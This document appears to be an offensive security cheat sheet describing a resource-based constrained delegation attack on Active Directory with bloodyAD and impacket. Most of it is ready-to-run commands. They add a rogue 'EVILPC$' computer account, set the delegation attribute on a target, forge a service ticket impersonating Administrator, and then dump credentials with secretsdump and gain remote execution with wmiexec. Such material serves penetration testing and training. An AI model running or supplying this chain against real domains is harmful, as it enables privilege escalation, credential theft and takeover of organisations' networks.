# 08.03 bloodyAD Computer Accounts RBCD

> Create computer accounts and set `msDS-AllowedToActOnBehalfOfOtherIdentity` with `bloodyAD` for a clean PS-free RBCD chain.

## Overview

bloodyAD can add computer accounts and set msDS-AllowedToActOnBehalfOfOtherIdentity directly. Combined with getST for S4U2Proxy, this is a clean RBCD chain that avoids PowerView and PowerShell on target.

## Steps

- add computer requires MachineAccountQuota > 0 OR CreateChild rights on the target OU
- set rbcd writes msDS-AllowedToActOnBehalfOfOtherIdentity: TARGET$ trusts EVILPC$ to impersonate
- After RBCD, use impacket getST for S4U2Self + S4U2Proxy impersonation
- LDAPS required for some DC configs — add --secure if standard LDAP fails
- remove rbcd clears the attribute; verify with get object --attr msDS-AllowedToActOnBehalfOfOtherIdentity
- Works with GenericWrite or WriteProperty on msDS-AllowedToActOnBehalfOfOtherIdentity

## Commands

### Add computer account

```bash
bloodyAD -u user -p pass -d DOMAIN --host DC_IP add computer EVILPC$ 'EvilPass123!'
# LDAPS variant:
bloodyAD -u user -p pass -d DOMAIN --host DC_IP --secure add computer EVILPC$ 'EvilPass123!'
```

### Set RBCD on target

```bash
# TARGET$ will allow EVILPC$ to impersonate users against it
bloodyAD -u user -p pass -d DOMAIN --host DC_IP set rbcd TARGET$ EVILPC$
# Read RBCD attribute to confirm:
bloodyAD -u user -p pass -d DOMAIN --host DC_IP get object TARGET$ --attr msDS-AllowedToActOnBehalfOfOtherIdentity
```

### Remove RBCD (cleanup)

```bash
bloodyAD -u user -p pass -d DOMAIN --host DC_IP remove rbcd TARGET$ EVILPC$
```

### Full RBCD chain (bloodyAD + impacket)

```bash
# 1. Add computer
bloodyAD -u user -p pass -d DOMAIN --host DC_IP add computer EVILPC$ 'EvilPass123!'
# 2. Set RBCD
bloodyAD -u user -p pass -d DOMAIN --host DC_IP set rbcd TARGET$ EVILPC$
# 3. Get impersonated service ticket
impacket-getST DOMAIN/EVILPC$:'EvilPass123!' -spn cifs/TARGET.DOMAIN.LOCAL -impersonate Administrator -dc-ip DC_IP
# 4. Use ticket
export KRB5CCNAME=Administrator@cifs_TARGET.DOMAIN.LOCAL@DOMAIN.LOCAL.ccache
impacket-secretsdump -k -no-pass DOMAIN/Administrator@TARGET.DOMAIN.LOCAL
impacket-wmiexec -k -no-pass DOMAIN/Administrator@TARGET.DOMAIN.LOCAL
```
